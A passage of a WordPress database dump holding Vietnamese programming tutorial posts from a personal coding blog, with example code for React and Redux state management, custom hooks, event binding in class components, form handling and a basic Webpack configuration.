store = Redux.createStore(rootReducer);\n        // Ném các middleware vào trong Redux.applyMiddleware()\n        const store = Redux.createStore(\n            rootReducer /* preloadedState, */,\n            composeEnhancers(Redux.applyMiddleware(processFunctionMiddleware, checkSymbolMiddleware))\n        );\n    </script>\n\n    <!-- =========== components/App.js =========== -->\n    <script type=\"text/babel\">\n        function App(props) {\n            const { listStudent, dispatch_saveStudent, dispatch_deleteStudent, dispatch_getAllStudent } = props;\n\n            const [filterName, setFilterName] = React.useState(\'\');\n            const [student, setStudent] = React.useState({ username: \'\', email: \'\', id: \'\' });\n\n            const updateState_student = (e) => {\n                let newStudent = { ...student };\n                newStudent[e.target.name] = e.target.value;\n                setStudent(newStudent)\n            };\n\n            const onSaveStudent = (e) => {\n                if (!student.username || !student.email) return;\n                dispatch_saveStudent(student);\n                //reset state sau khi save xong\n                setStudent({ username: \'\', email: \'\', id: \'\' });\n            };\n\n            return (\n                <div>\n                    <button onClick={() => { setStudent({ username: \'\', email: \'\', id: \'\' }) }}>New Student</button> <br />\n                    <input type=\"text\" placeholder=\"username\" name=\"username\"\n                        value={student.username}\n                        onChange={updateState_student}\n                    /> <br />\n                    <input\n                        type=\"text\" placeholder=\"email\" name=\"email\"\n                        value={student.email}\n                        onChange={updateState_student}\n                    /> <br />\n                    <button onClick={onSaveStudent}>\n                        {student.id ? \'Update Student\' : \'Add Student\'}\n                    </button> <br /> <br />\n                    <input type=\"text\" placeholder=\"Search ...\" name=\"txtFilterName\"\n                        value={filterName}\n                        onChange={e => { setFilterName(e.target.value) }}\n                    />\n                    <table>\n                        <thead>\n                            <tr>\n                                <th>#</th>\n                                <th>Username</th>\n                                <th>Email</th>\n                                <th>Action</th>\n                            </tr>\n                        </thead>\n                        <tbody>\n                            {\n                                listStudent\n                                    .filter((item) => item.username.includes(filterName))\n                                    .map((item, index) => {\n                                        return (\n                                            <tr key={item.id}>\n                                                <td>{index}</td>\n                                                <td>{item.username}</td>\n                                                <td>{item.email}</td>\n                                                <td>\n                                                    <button onClick={e => { setStudent({ ...item }) }}>Sửa</button>\n                                                    <button onClick={e => { dispatch_deleteStudent(item.id) }}>Xóa</button>\n                                                </td>\n                                            </tr>\n                                        );\n                                    })\n                            }\n                        </tbody>\n                    </table>\n                    <button onClick={e => { dispatch_getAllStudent() }}>Get Student Online</button>\n                </div>\n            );\n\n        }\n    </script>\n\n    <!-- =========== container/AppContainer.js =========== -->\n    <script type=\"text/babel\">\n        //Dùng riêng 1 HOC mục đích chỉ để hứng các props từ Redux\n        //Các props hứng được từ Redux lại chuyển tiếp về Component\n        //mapStateToProps: chuyển state từ store thành props của component\n        let mapStateToProps_App = (state) => ({\n            listStudent: state.listStudent,\n        })\n        //mapDispatchToProps: chuyển action từ store thành props của component\n        let mapDispatchToProps_App = (dispatch, props) => ({\n            dispatch_saveStudent: (student) => {\n                dispatch(action_saveStudent(student));\n            },\n            dispatch_deleteStudent: (id) => {\n                dispatch(action_deleteStudent(id));\n            },\n            dispatch_getAllStudent: () => {\n                dispatch(action_getAllStudent());\n            },\n        })\n\n        //connect Component Container với Redux bằng connect với 2 biến là props: mapStateToProps, mapDispatchToProps\n        let AppConnect = ReactRedux.connect(mapStateToProps_App, mapDispatchToProps_App)(App);\n    </script>\n\n    <!-- =========== src/index.js =========== -->\n    <script type=\"text/babel\">\n        //Connect React và Redux bằng Provider, với store=store đã được khai báo ở trên\n        const Provider = ReactRedux.Provider;\n        ReactDOM.render(\n            <Provider store={store}>\n                <AppConnect />\n            </Provider>,\n            document.getElementById(\'root\')\n        );\n    </script>\n</body>\n\n</html>\n</pre>', 'Demo-CRUD: 2. ListStudent with Redux, use Middleware', '', 'publish', 'open', 'open', '', 'demo-crud-2-liststudent-with-redux-use-middleware', '', '', '2021-06-29 02:00:58', '2021-06-28 19:00:58', '', 0, 'https://duycode.com/?p=1324', 0, 'post', '', 0),
(1326, 1, '2021-05-01 08:00:23', '2021-05-01 01:00:23', '<h2>1. Khi nhiều Component có logic giống nhau</h2>\r\n<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<head>\r\n    <meta charset=\"UTF-8\" />\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\r\n    <title>ReactJS</title>\r\n</head>\r\n\r\n<body>\r\n    <div id=\"root\"></div>\r\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\r\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\r\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\r\n\r\n    <script type=\"text/babel\">\r\n        const { useState, useEffect } = React\r\n\r\n        // User và Photo có logic giống hệt nhau phần get Data về\r\n        const User = ({ url }) => {\r\n            const [loading, setLoading] = useState(false)\r\n            const [dataInfo, setDataInfo] = useState(null)\r\n            const [failed, setFailed] = useState(null)\r\n\r\n            useEffect(() => {\r\n                setLoading(true)\r\n                let fetching = true;\r\n                fetch(url)\r\n                    .then(res => {\r\n                        if (fetching) {\r\n                            if (res.ok) return res.json()\r\n                            throw { status: res.status, ok: res.ok }\r\n                        }\r\n                    })\r\n                    .then(res => {\r\n                        if (fetching) {\r\n                            setDataInfo(res)\r\n                            setFailed(null)\r\n                        }\r\n                    })\r\n                    .catch(err => {\r\n                        if (fetching) {\r\n                            setDataInfo(null)\r\n                            setFailed(err)\r\n                        }\r\n                    })\r\n                    .finally(() => {\r\n                        setLoading(false)\r\n                    })\r\n                return () => fetching = false\r\n            }, [url])\r\n\r\n            console.log({ loading, dataInfo, failed })\r\n\r\n            return (\r\n                <div>\r\n                    <h3>User info</h3>\r\n                    {loading && <p>Loading...</p>}\r\n                    {!loading && dataInfo && <p>UserInfo: {JSON.stringify(dataInfo, null, 4)}</p>}\r\n                    {!loading && failed && <p>Failed: {JSON.stringify(failed, null, 4)}</p>}\r\n                </div>\r\n            )\r\n        }\r\n\r\n        // User và Photo có logic giống hệt nhau phần get Data về\r\n        const Photo = ({ url }) => {\r\n            const [loading, setLoading] = useState(false)\r\n            const [dataInfo, setDataInfo] = useState(null)\r\n            const [failed, setFailed] = useState(null)\r\n\r\n            useEffect(() => {\r\n                setLoading(true)\r\n                let fetching = true;\r\n                fetch(url)\r\n                    .then(res => {\r\n                        if (fetching) {\r\n                            if (res.ok) return res.json()\r\n                            throw { status: res.status, ok: res.ok }\r\n                        }\r\n                    })\r\n                    .then(res => {\r\n                        if (fetching) {\r\n                            setDataInfo(res)\r\n                            setFailed(null)\r\n                        }\r\n                    })\r\n                    .catch(err => {\r\n                        if (fetching) {\r\n                            setDataInfo(null)\r\n                            setFailed(err)\r\n                        }\r\n                    })\r\n                    .finally(() => {\r\n                        setLoading(false)\r\n                    })\r\n                return () => fetching = false\r\n            }, [url])\r\n\r\n            console.log({ loading, dataInfo, failed })\r\n\r\n            return (\r\n                <div>\r\n                    <h3>Photo info</h3>\r\n                    {loading && <p>Loading...</p>}\r\n                    {!loading && dataInfo && <p>PhotoInfo: {JSON.stringify(dataInfo, null, 4)}</p>}\r\n                    {!loading && failed && <p>Failed: {JSON.stringify(failed, null, 4)}</p>}\r\n                </div>\r\n            )\r\n        }\r\n\r\n        const App = () => {\r\n            const [number, setNumber] = useState(1)\r\n            return (\r\n                <div>\r\n                    <p>Number: {number}</p>\r\n                    <button onClick={() => { setNumber(number + 1) }}>Increase</button>\r\n                    <User url={`https://reqres.in/api/users/${number}`} />\r\n                    <Photo url={`https://jsonplaceholder.typicode.com/photos/${number}`} />\r\n                </div>\r\n            )\r\n        }\r\n\r\n        ReactDOM.render(<App />, document.getElementById(\'root\'))\r\n    </script>\r\n</body>\r\n\r\n</html>\r\n</pre>\r\n\r\n<h2>2. Tạo thử 1 custom hooks có tên: useFetchData()</h2>\r\n<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<head>\r\n    <meta charset=\"UTF-8\" />\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\" />\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\r\n    <title>ReactJS</title>\r\n</head>\r\n\r\n<body>\r\n    <div id=\"root\"></div>\r\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\r\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\r\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\r\n\r\n    <script type=\"text/babel\">\r\n        const { useState, useEffect } = React\r\n\r\n        const useFetchData = (url) => {\r\n            const [loading, setLoading] = useState(false)\r\n            const [dataInfo, setDataInfo] = useState(null)\r\n            const [failed, setFailed] = useState(null)\r\n\r\n            useEffect(() => {\r\n                setLoading(true)\r\n                let fetching = true;\r\n                fetch(url)\r\n                    .then(res => {\r\n                        if (fetching) {\r\n                            if (res.ok) return res.json()\r\n                            throw { status: res.status, ok: res.ok }\r\n                        }\r\n                    })\r\n                    .then(res => {\r\n                        if (fetching) {\r\n                            setDataInfo(res)\r\n                            setFailed(null)\r\n                        }\r\n                    })\r\n                    .catch(err => {\r\n                        if (fetching) {\r\n                            setDataInfo(null)\r\n                            setFailed(err)\r\n                        }\r\n                    })\r\n                    .finally(() => {\r\n                        setLoading(false)\r\n                    })\r\n                return () => fetching = false\r\n            }, [url])\r\n\r\n            return { loading, dataInfo, failed }\r\n        }\r\n\r\n        // User và Photo có logic giống hệt nhau phần get Data về\r\n        const User = ({ url }) => {\r\n            const { loading, dataInfo, failed } = useFetchData(url)\r\n            console.log({ loading, dataInfo, failed })\r\n\r\n            return (\r\n                <div>\r\n                    <h3>User info</h3>\r\n                    {loading && <p>Loading...</p>}\r\n                    {!loading && dataInfo && <p>UserInfo: {JSON.stringify(dataInfo, null, 4)}</p>}\r\n                    {!loading && failed && <p>Failed: {JSON.stringify(failed, null, 4)}</p>}\r\n                </div>\r\n            )\r\n        }\r\n\r\n        // User và Photo có logic giống hệt nhau phần get Data về\r\n        const Photo = ({ url }) => {\r\n            const { loading, dataInfo, failed } = useFetchData(url)\r\n            console.log({ loading, dataInfo, failed })\r\n            \r\n            return (\r\n                <div>\r\n                    <h3>Photo info</h3>\r\n                    {loading && <p>Loading...</p>}\r\n                    {!loading && dataInfo && <p>PhotoInfo: {JSON.stringify(dataInfo, null, 4)}</p>}\r\n                    {!loading && failed && <p>Failed: {JSON.stringify(failed, null, 4)}</p>}\r\n                </div>\r\n            )\r\n        }\r\n\r\n        const App = () => {\r\n            const [number, setNumber] = useState(1)\r\n            return (\r\n                <div>\r\n                    <p>Number: {number}</p>\r\n                    <button onClick={() => { setNumber(number + 1) }}>Increase</button>\r\n                    <User url={`https://reqres.in/api/users/${number}`} />\r\n                    <Photo url={`https://jsonplaceholder.typicode.com/photos/${number}`} />\r\n                </div>\r\n            )\r\n        }\r\n\r\n        ReactDOM.render(<App />, document.getElementById(\'root\'))\r\n    </script>\r\n</body>\r\n\r\n</html>\r\n</pre>', 'ReactJS - 8. Custom Hooks', '', 'publish', 'open', 'open', '', 'reactjs-8-custom-hooks', '', '', '2022-05-20 17:38:42', '2022-05-20 10:38:42', '', 0, 'https://duycode.com/?p=1326', 0, 'post', '', 0),
(1329, 1, '2021-07-15 04:01:22', '2021-07-14 21:01:22', '-- Props: truyền dữ liệu từ component cha cho component con\n-- State: dữ liệu nội bộ của 1 component\n-- Global State: dữ liệu của nhiều component -> thường dùng Redux\n\n<h2>1. State</h2>\n<pre>\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>ReactJS</title>\n</head>\n\n<body>\n    <div id=\"root\"></div>\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\n\n    <script type=\"text/babel\">\n        class App extends React.Component {\n            constructor(props) {\n                super(props);\n\n                this.state = {\n                    username: \'username...\'\n                }\n            };\n\n            //input lấy value realtime từ state\n            //input set ngược lại state bằng onchange(), trong đó biến event được gán vào tự động\n            //set State bằng setState();\n            render() {\n                return (\n                    <div>\n                        <input type=\"text\" value={this.state.username}\n                            onChange={(e) => { this.setState({ username: e.target.value }) }} />\n                        <h4>{this.state.username}</h4>\n                    </div>\n                );\n            }\n        }\n\n        ReactDOM.render(\n            <App />,\n            document.getElementById(\'root\')\n        );\n\n    </script>\n</body>\n\n</html>\n</pre>\n\n<h2>2. Props</h2>\n-- Truyền dữ liệu từ component cha về component con bằng cách dùng props là ok\n-- Ông component con truyền ngược lại cha bằng callback -> happy\n<pre>\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>ReactJS</title>\n</head>\n\n<body>\n    <div id=\"root\"></div>\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\n\n    <script type=\"text/babel\">\n        class App extends React.Component {\n            constructor(props) {\n                super(props);\n\n                this.state = {\n                    username: \'username...\'\n                }\n                this.onUpdateState = this.onUpdateState.bind(this);\n            };\n            onUpdateState(e, customText=\"\") {\n                this.setState({ username: e.target.value + customText });\n            }\n            render() {\n                return (\n                    <div>\n                        <Content myDataProp={this.state.username}\n                            updateStateProp={this.onUpdateState}></Content>\n                    </div>\n                );\n            }\n        }\n\n        //input nhận dữ liệu từ component cha thông qua props\n        //input bắn dữ liệu ngược lại về component cha bằng callback\n        //có thể dùng thêm parametter bằng cách dùng dùng arrow function\n        class Content extends React.Component {\n            constructor(props) {\n                super(props);\n                this.customText = \" - plus\"\n            };\n            render() {\n                return (\n                    <div>\n                        <input type=\"text\" onChange={(event) => { this.props.updateStateProp(event, this.customText) }} />\n                        <input type=\"text\" onChange={this.props.updateStateProp} />\n                        <h3>{this.props.myDataProp}</h3>\n                    </div>\n                );\n            }\n        }\n\n        ReactDOM.render(\n            <App />,\n            document.getElementById(\'root\')\n        );\n\n    </script>\n</body>\n\n</html>\n</pre>', 'ReactJS - 4.1. Class: Props, State và Global State', '', 'publish', 'open', 'open', '', 'reactjs-4-1-class-props-state-va-global-state', '', '', '2021-07-15 04:01:22', '2021-07-14 21:01:22', '', 0, 'https://duycode.com/?p=1329', 0, 'post', '', 0);
INSERT INTO `duycode_posts` (`ID`, `post_author`, `post_date`, `post_date_gmt`, `post_content`, `post_title`, `post_excerpt`, `post_status`, `comment_status`, `ping_status`, `post_password`, `post_name`, `to_ping`, `pinged`, `post_modified`, `post_modified_gmt`, `post_content_filtered`, `post_parent`, `guid`, `menu_order`, `post_type`, `post_mime_type`, `comment_count`) VALUES
(1331, 1, '2021-07-15 03:00:23', '2021-07-14 20:00:23', '<pre>\n<!DOCTYPE html>\n<html lang=\"en\">\n\n<head>\n    <meta charset=\"UTF-8\">\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>ReactJS</title>\n</head>\n\n<body>\n    <div id=\"root\"></div>\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\n\n    <script type=\"text/babel\">\n        class App extends React.Component {\n             customer;\n            constructor(props) {\n                super(props);\n                this.customText = \"hahaha, this is cutom text\"\n                this.onClickConstruct = this.onClickConstruct.bind(this, this.customText)\n            }\n            //biến event tự động được gán vào hàm khi được gọi bằng phương thước event trong render\n            //event này là event của react, không giống event của javascript\n            //thường hay lấy: even.target để lấy element đc action bởi event\n            onClickNormal(e) {\n                console.log(\"props: \",this.customer)\n                //Không thể sử dụng \"console.log(\"Props: \",this.props)\" ở đây\n                //vì ở hàm này là 1 funtion bình thường của onclick trong object của \"button\" có dạng: onclick = function(){}\n                // => vì vậy \"this\" sẽ trỏ về \"button\"\n                console.log(e, e.target);\n                alert(\'onClickNormal\');\n            }\n            onClickArrowFuntion(e) {\n                //Có thể sử dụng \"console.log(\"Props: \",this.props)\" ở đây\n                //vì ở hàm này là 1 funtion bình thường => \"this\" sẽ trỏ về thằng cha của nó\n                //mà thằng cha của nó lại là 1 arrow funtion => nên \"this\" lại chính là \"this\" của thằng arrow-function đó\n                //arrowfunction đó của onclick trong object của \"button\" có dạng: onclick = ()=>{}\n                // => \'this\' của arrowfunction lại là thằng chứa thằng \"button\" => chính là đối tượng của class này :v hahaha\n                console.log(e, e.target);\n                alert(\'onClickArrowFuntion\');\n            }\n            onClickArrowFuntion2 = (e) => {\n                //được dùng \"this\", vì đây là arrowfuntion => this sẽ trỏ về đối tượng của class\n                console.log(\"Props: \",this.props)\n                console.log(e, e.target);\n                alert(\'onClickArrowFuntion2\');\n            }\n\n\n            //Muốn sử dụng \"this\" như \"this.props\" thì cần \"bind(this)\" vào khi gọi hàm, nếu không sẽ gây ra lỗi\n            onclickBind(text) {\n                console.log(\"Props: \", this.props);\n                alert(text);\n            }\n            onClickConstruct(text) {\n                console.log(\"Props: \", this.props);\n                alert(text);\n            }\n            onClickBindAndArrowFunction(event, text) {\n                console.log(\"Props: \", this.props);\n                console.log(event);\n                alert(text);\n            }\n\n            //1. Có thể dùng function 1 cách trực tiếp\n            //2. Có thể bind this và param trong html\n            //3. Cũng có thể bind khi gọi biến tại constructor\n            //4. Cũng có thể dùng arrow funtion để gọi hàm\n            render() {\n                return (\n                    <div>\n                        <button type=\"button\" className=\"btn btn-default\" onClick={this.onClickNormal}>\n                            onClickNormal !\n                        </button><br /><br />\n                        <button type=\"button\" className=\"btn btn-default\" onClick={(e) => this.onClickArrowFuntion(e)}>\n                            onClickArrowFuntion !\n                        </button><br /><br />\n                        <button type=\"button\" className=\"btn btn-default\" onClick={this.onClickArrowFuntion2}>\n                            onClickArrowFuntion2 !\n                        </button><br /><br /><hr /><br />\n\n                        <button type=\"button\" className=\"btn btn-default\" onClick={this.onclickBind.bind(this, this.customText)}>\n                            onclickBind !\n                        </button><br /><br />\n                        <button type=\"button\" className=\"btn btn-default\" onClick={this.onClickConstruct}>\n                            onClickConstruct !\n                        </button><br /><br />\n                        <button type=\"button\" className=\"btn btn-default\" onClick={(event) => this.onClickBindAndArrowFunction(event, this.customText)}>\n                            onClickBindAndArrowFunction !\n                        </button><br /><br />\n                    </div>\n                );\n            }\n        }\n\n        ReactDOM.render(\n            <App />,\n            document.getElementById(\'root\')\n        );\n\n    </script>\n</body>\n\n</html>\n</pre>', 'Tutorial – 3. Event, sử dụng \'this\' trong Class', '', 'publish', 'open', 'open', '', 'tutorial-3-event-su-dung-this-trong-class', '', '', '2021-07-15 03:00:23', '2021-07-14 20:00:23', '', 0, 'https://duycode.com/?p=1331', 0, 'post', '', 0),
(1343, 1, '2021-07-08 14:03:09', '2021-07-08 07:03:09', '<h2>1. Cài đặt thư viện</h2>\r\n<img src=\"https://webpack.js.org/icon-square-small.85ba630cf0c5f29ae3e3.svg\" width=\"50px\" height=\"50px\" alt=\"\">\r\n<pre>\r\n//webpack core:\r\nnpm i -D @babel/core babel-loader @babel/preset-env @babel/preset-react\r\n\r\n//webpack server\r\nnpm i -D webpack webpack-cli webpack-dev-server\r\n\r\n//css loader\r\nnpm i -D style-loader css-loader sass sass-loader\r\n\r\n//file loader \r\nnpm i -D file-loader\r\n\r\n//typscript loader\r\nnpm i -D typescript ts-loader\r\n\r\n//plugin: dọn dẹp thư mục dist, tạo file html, tách file css\r\nnpm i -D clean-webpack-plugin html-webpack-plugin mini-css-extract-plugin\r\n\r\n// plugin thống kê dung lượng file Weboack\r\nnpm i -D webpack-bundle-analyzer\r\n</pre>\r\n\r\n<pre>\r\n    <!-- Full Install :D -->\r\n    npm i -D @babel/core babel-loader @babel/preset-env @babel/preset-react webpack webpack-cli webpack-dev-server style-loader css-loader sass sass-loader file-loader typescript ts-loader html-webpack-plugin mini-css-extract-plugin webpack-bundle-analyzer\r\n</pre>\r\n\r\n<h2>2. Tạo file ./webpack.config.js</h2>\r\n<pre>\r\nconst { CleanWebpackPlugin } = require(\'clean-webpack-plugin\');\r\nconst HtmlWebpackPlugin = require(\'html-webpack-plugin\');\r\nconst MiniCssExtractPlugin = require(\'mini-css-extract-plugin\');\r\nconst path = require(\'path\');\r\n\r\nmodule.exports = (env = {}, options = {}) => {\r\n    return {\r\n        entry: { bundle: \'./src/index.js\' },\r\n        output: {\r\n            path: path.resolve(__dirname, \'dist\'),\r\n            filename: \'bundle.js\',\r\n        },\r\n        module: {\r\n            rules: [\r\n                // Loader file js, jsx => preset-env để chuyển ES6 trở lên về ES5, preset-react chuyển JSX về ES5\r\n                {\r\n                    test: /\\.js$|\\.jsx$/i,\r\n                    use: {\r\n                        loader: \'babel-loader\',\r\n                        options: {\r\n                            \"presets\": [\"@babel/preset-env\", \"@babel/preset-react\"]\r\n                        }\r\n                    },\r\n                    include: path.resolve(__dirname, \'src\'),\r\n                    exclude: /node_modules/,\r\n                },\r\n\r\n                // Loader file css, scss, sass\r\n                // Ở mode development => inject css vào thẻ \"<style></style>\" cho tốc độ nhanh hơn\r\n                // Ở mode production => tạo ra file css mới bằng \"MiniCssExtractPlugin\" để load file nhanh hơn\r\n                {\r\n                    test: /\\.(sa|sc|c)ss$/i,\r\n                    use: [\r\n                        ((mode) => {\r\n                            if (mode == \"development\") return \"style-loader\"\r\n                            if (mode == \"production\") return MiniCssExtractPlugin.loader\r\n                        })(options.mode),\r\n                        \"css-loader\",\r\n                        \"sass-loader\"\r\n                    ],\r\n                    include: path.resolve(__dirname, \'src\'),\r\n                },\r\n\r\n                // Loader file, trường hợp này là loader ảnh :D\r\n                {\r\n                    test: /\\.(png|jpe?g|gif|svg)$/i,\r\n                    loader: \'file-loader\',\r\n                    options: {\r\n                        outputPath: \'images\',\r\n                        name: \'[name]_[hash:base64:5].[ext]\',\r\n                    },\r\n                },\r\n            ]\r\n        },\r\n        plugins: [\r\n            // Dọn dẹp thư mục /dist\r\n            new CleanWebpackPlugin(),\r\n            // Tạo ra file HTML bằng plugin\r\n            new HtmlWebpackPlugin({\r\n                templateContent: `<html><head><meta charset=\"UTF-8\"></head><body><div id=\"app\"></div></body></html>`,\r\n                meta: { \'viewport\': \'width=device-width, initial-scale=1.0\' },\r\n            }),\r\n            //Tách css thành 1 file riêng bằng plugin\r\n            new MiniCssExtractPlugin()\r\n        ],\r\n        // Hiển thị khi build\r\n        stats: {\r\n            modules: false,\r\n        },\r\n        // Cài đặt webpack-server\r\n        devServer: {\r\n            static: path.resolve(__dirname, \'dist\'),\r\n            port: 5556,\r\n        },\r\n    }\r\n};\r\n</pre>\r\n\r\n<h2>3. Sử dụng CSS trong dự án</h2>\r\n\r\n<h3>Dạng 1. Sử dụng dạng global</h3>\r\n<pre>\r\nimport \'./reset.css\'\r\nimport \'./index.scss\'\r\n</pre>\r\n\r\n<h3>Dạng 2. Sử dụng dạng module</h3>\r\n-- Cài đặt webpack-config\r\n<pre>\r\n{\r\n    loader: \"css-loader\",\r\n    options: {\r\n        esModule: true,\r\n        modules: {\r\n            namedExport: true,\r\n            localIdentName: \"[name]__[local]__[hash:base64:5]\",\r\n        },\r\n    },\r\n},\r\n\"sass-loader\"\r\n</pre>\r\n<pre>\r\nimport * as styles from \'./header.css\'\r\nimport * as styles from \'./main.scss\'\r\n</pre>\r\n\r\n<h3>Dạng 3. Sử dụng dạng CSS-in-JS</h3>\r\n- Cách này không cần sử dụng webpack\r\n- Sử dụng các thư viện ngoài như: style-component', 'Webpack cơ bản', '', 'publish', 'open', 'open', '', 'webpack-co-ban', '', '', '2022-08-20 03:25:41', '2022-08-20 03:25:41', '', 0, 'https://duycode.com/?p=1343', 0, 'post', '', 0),
(1346, 1, '2021-05-02 01:00:04', '2021-05-01 18:00:04', '<h2>1. Function Component</h2>\r\n<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\r\n    <title>ReactJS</title>\r\n</head>\r\n\r\n<body>\r\n    <div id=\"root\"></div>\r\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\r\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\r\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\r\n\r\n    <script type=\"text/babel\">\r\n        const { useState } = React;\r\n\r\n        const App = () => {\r\n            const [username, setUsername] = useState(\'Micheal Jackson...\')\r\n            const [gender, setGender] = useState(\'1\')\r\n            const [languages, setLanguages] = useState([\"Javascript\", \"PHP\"])\r\n\r\n            const handleChangeCheckbox = (e) => {\r\n                let value = e.target.value;\r\n                if (e.target.checked) {\r\n                    setLanguages([...languages, value])\r\n                } else {\r\n                    setLanguages(oldLanguages => oldLanguages.filter(item => item !== value))\r\n                }\r\n            }\r\n\r\n            console.log({username, gender, languages})\r\n\r\n            return (\r\n                <div>\r\n                    <input value={username} type=\"text\" name=\"username\" onChange={(e)=>setUsername(e.target.value)} /><br /><br />\r\n\r\n                    <select name=\"gender\" value={gender} onChange={(e)=>setGender(e.target.value)}>\r\n                        <option value=\"0\">Nam</option>\r\n                        <option value=\"1\">Nữ</option>\r\n                    </select><br /><br />\r\n\r\n                    <input type=\"radio\" id=\"gender0\" name=\"gender\"\r\n                        value=\"0\"\r\n                        onChange={(e)=>setGender(e.target.value)}\r\n                        checked={gender == \"0\"} />\r\n                    <label htmlFor=\"gender0\">Nam</label>\r\n\r\n                    <input type=\"radio\" id=\"gender1\" name=\"gender\"\r\n                        value=\"1\"\r\n                        onChange={(e)=>setGender(e.target.value)}\r\n                        checked={gender == \"1\"} />\r\n                    <label htmlFor=\"gender1\">Nữ</label><br /><br />\r\n\r\n                    <input type=\"checkbox\" name=\"languages\" id=\"language0\"\r\n                        value=\"Javascript\"\r\n                        onChange={handleChangeCheckbox}\r\n                        checked={languages.includes(\"Javascript\")} />\r\n                    <label htmlFor=\"language0\">Javascript</label><br />\r\n\r\n                    <input type=\"checkbox\" name=\"languages\" id=\"language1\"\r\n                        value=\"PHP\"\r\n                        onChange={handleChangeCheckbox}\r\n                        checked={languages.includes(\"PHP\")} />\r\n                    <label htmlFor=\"language1\">PHP</label><br />\r\n\r\n                    <input type=\"checkbox\" name=\"languages\" id=\"language2\"\r\n                        value=\"C++\"\r\n                        onChange={handleChangeCheckbox}\r\n                        checked={languages.includes(\"C++\")} />\r\n                    <label htmlFor=\"language2\">C++</label><br />\r\n\r\n                    <p>Username: <span>{username}</span></p>\r\n                    <p>Gender: <span>{gender}</span></p>\r\n                    <p>Languages: <span>{languages.join(\", \")}</span></p>\r\n                </div>\r\n            );\r\n\r\n        }\r\n\r\n        ReactDOM.render(\r\n            <App />,\r\n            document.getElementById(\'root\')\r\n        );\r\n\r\n    </script>\r\n</body>\r\n\r\n</html>\r\n</pre>\r\n\r\n<h2>2. Class Component</h2>\r\n<pre>\r\n<!DOCTYPE html>\r\n<html lang=\"en\">\r\n\r\n<head>\r\n    <meta charset=\"UTF-8\">\r\n    <meta http-equiv=\"X-UA-Compatible\" content=\"IE=edge\">\r\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\r\n    <title>ReactJS</title>\r\n</head>\r\n\r\n<body>\r\n    <div id=\"root\"></div>\r\n    <script crossorigin src=\"https://unpkg.com/react@17/umd/react.development.js\"></script>\r\n    <script crossorigin src=\"https://unpkg.com/react-dom@17/umd/react-dom.development.js\"></script>\r\n    <script src=\"https://unpkg.com/babel-standalone@6/babel.min.js\"></script>\r\n\r\n    <script type=\"text/babel\">\r\n        class App extends React.Component {\r\n            constructor(props) {\r\n                super(props);\r\n\r\n                this.state = {\r\n                    username: \'Micheal Jackson...\',\r\n                    gender: \'1\',\r\n                    languages: [\"Javascript\", \"PHP\"],\r\n                }\r\n            };\r\n\r\n            handleChangeInput = (e) => {\r\n                this.setState({\r\n                    [e.target.name]: e.target.value\r\n                });\r\n            }\r\n\r\n            handleChangeCheckbox = (e) => {\r\n                let value = e.target.value;\r\n                let languages_array = this.state.languages;\r\n                if (e.target.checked) {\r\n                    languages_array.push(value);\r\n                } else {\r\n                    languages_array = languages_array.filter(item => item !== value)\r\n                }\r\n                this.setState({\r\n                    [e.target.name]: languages_array\r\n                });\r\n            }\r\n\r\n\r\n            //cần set value và onchange cùng 1 lúc ở form\r\n            render() {\r\n                console.log(this.state);\r\n                return (\r\n                    <div>\r\n                        <input value={this.state.username} type=\"text\" name=\"username\" onChange={this.handleChangeInput} /><br /><br />\r\n\r\n                        <select name=\"gender\" value={this.state.gender} onChange={this.handleChangeInput}>\r\n                            <option value=\"0\">Nam</option>\r\n                            <option value=\"1\">Nữ</option>\r\n                        </select><br /><br />\r\n\r\n                        <input type=\"radio\" id=\"gender0\" name=\"gender\"\r\n                            value=\"0\"\r\n                            onChange={this.handleChangeInput}\r\n                            checked={this.state.gender == \"0\"} />\r\n                        <label 